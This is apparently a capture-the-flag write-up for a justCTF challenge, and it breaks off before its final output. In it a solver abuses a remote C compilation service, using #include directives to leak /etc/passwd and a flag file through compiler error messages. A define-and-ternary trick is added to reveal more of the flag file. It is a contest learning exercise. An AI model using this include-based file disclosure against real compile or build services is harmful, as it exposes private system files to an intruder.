Vesim is a CS student. This semester he is really struggling to pass computability and formal language
theory course. He asked for a last chance, so the professor gave him a task: "For a given Python program, tell
me if it will eventually stop or not!". Sadly Vesim was pwning and reversing so he didnâ€™t have time to solve this
problem. Could you help him?
The professor agreed to host the submission system on his private server.
Funny fact: At home the professor has a wide collection of flags from all over the world!

I NPUT
First line of input contains number N .
Following N lines contain Python source code.

OUTPUT
If the given Python program stops, the output shall contain "YES", otherwise "NO".

EXAMPLES

Input
2
while 1:
pass

Output
NO

Input
1
print("jctf{stop!}")

Output
YES
```

## Solution

At first, I've checked the endpoint:
```
How many lines does your C program parsing a Python code have?
1
Write your program now:
int main(void) {puts("gopa");}
Ok, let's build it!
...
GO LEARN MORE CS OR YOU WILL NEVER PASS IT!!11!
```
NOTE: At the begining of the ctf there was an linking error (e.g. `ld: error: cannot write into /dev/null` or something like this) instead of this `GO LEARN MORE CS..` text.

So, if our code will not be linked and executed the information disclosure should be happen in the compilation process, also recently I heard that system files could be partly read with `#include` directives of cpp (C preprocessor).

After it, I've tried to see usernames of the "professor's" computer, because flag should be in users home directory:
```
~/g/c/will_it_stop> cat test1.txt 
1
#include "/etc/passwd"
~/g/c/will_it_stop> cat test1.txt | nc 2019.nc.jctf.pro 1342
How many lines does your C program parsing a Python code have?
Write your program now:
Ok, let's build it!
In file included from <stdin>:1:0:
/etc/passwd:1:8: error: expected '=', ',', ';', 'asm' or '__attribute__' before ':' token
 aturing:x:1000:1000::/home/aturing:/bin/sh
        ^
COMPILATION FAILED
```

Seems like, username is aturing, so flag should be `/home/aturing/flag`:

```
~/g/c/will_it_stop> cat test2.txt 
1
#include "/home/aturing/flag"
~/g/c/will_it_stop> cat test2.txt | nc 2019.nc.jctf.pro 1342

Write your program now:
Ok, let's build it!
In file included from <stdin>:1:0:
/home/aturing/flag:1:8: error: expected '=', ',', ';', 'asm' or '__attribute__' before ':' token
 justCTF:is_this_the_real_flag__is_this_just_fantasy__open_your_eyes_look_bellow_in_the_file_and_see
        ^
COMPILATION FAILED
```

Here I've stuck for a while, becouse I needed to somehow reveal the contents of the second line of the file,
to do this the error on /home/aturing/flag:1 should be "fixed".

In C symbol `:` is used for ternary operator (e.g. `STATEMENT ? "IF TRUE" : "IF FALSE"`), and for bitfields
I've decided that it would be easier to use ternary operator and with trial and error I've came to this:

```
~/g/c/will_it_stop> cat test.txt
4
#define justCTF 1
int is_this_the_real_flag__is_this_just_fantasy__open_your_eyes_look_bellow_in_the_file_and_see = 1;
int gopa = 1 ?
#include </home/aturing/flag>
~/g/c/will_it_stop> cat test.txt | nc 2019.nc.jctf.pro 1342
